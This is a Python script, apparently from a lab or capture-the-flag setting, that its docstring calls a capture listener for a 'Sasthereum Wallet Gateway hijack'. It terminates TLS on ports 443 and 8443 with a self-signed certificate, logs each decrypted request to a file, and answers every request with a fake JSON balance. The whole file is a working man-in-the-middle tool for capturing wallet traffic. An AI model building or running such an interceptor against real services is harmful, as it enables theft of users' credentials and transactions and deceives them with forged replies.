"""
TLS-terminating capture listener for the Sasthereum Wallet Gateway hijack.

Wraps every incoming connection on 10.0.2.80:{443,8443} with a self-signed
cert and logs the cleartext request payload to /tmp/wallet_tls.log.
"""
import socket
import threading
import ssl
import datetime
import time

LOG = "/tmp/wallet_tls.log"

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("/tmp/cert.pem", "/tmp/key.pem")
ctx.set_alpn_protocols(["http/1.1", "h2"])


def log(msg):
    with open(LOG, "ab") as f:
        f.write(msg if isinstance(msg, bytes) else msg.encode())


def handle_tls(raw, addr, port):
    try:
        raw.settimeout(8)
        s = ctx.wrap_socket(raw, server_side=True)
        data = b""
        s.settimeout(8)
        while True:
            try:
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
                if b"\r\n\r\n" in data:
                    head, _, rest = data.partition(b"\r\n\r\n")
                    cl = 0
                    for line in head.split(b"\r\n"):
                        if line.lower().startswith(b"content-length:"):
                            try:
                                cl = int(line.split(b":", 1)[1].strip())
                            except Exception:
                                pass
                    if len(rest) >= cl:
                        break
            except socket.timeout:
                break
        ts = datetime.datetime.now().isoformat()
        alpn = s.selected_alpn_protocol()
        hdr = "\n=== %s TLS port=%d from=%s alpn=%s bytes=%d ===\n" % (
            ts, port, addr, alpn, len(data),
        )
        log(hdr)
        log(data)
        log(b"\n--- end ---\n")
        try:
            body = b'{"status":"ok","balance":0}'
            s.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/json\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + body
            )
        except Exception as e:
            log("send err: %s\n" % e)
    except Exception as e:
        log("\n[ERR %s port=%d from=%s]: %s\n" % (
            datetime.datetime.now().isoformat(), port, addr, e,
        ))
    finally:
        try:
            raw.close()
        except Exception:
            pass


def listen(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.0.2.80", port))
    s.listen(50)
    log("\nlistening TLS on 10.0.2.80:%d\n" % port)
    while True:
        c, a = s.accept()
        threading.Thread(
            target=handle_tls, args=(c, a, port), daemon=True
        ).start()


for p in [443, 8443]:
    threading.Thread(target=listen, args=(p,), daemon=True).start()

while True:
    time.sleep(60)
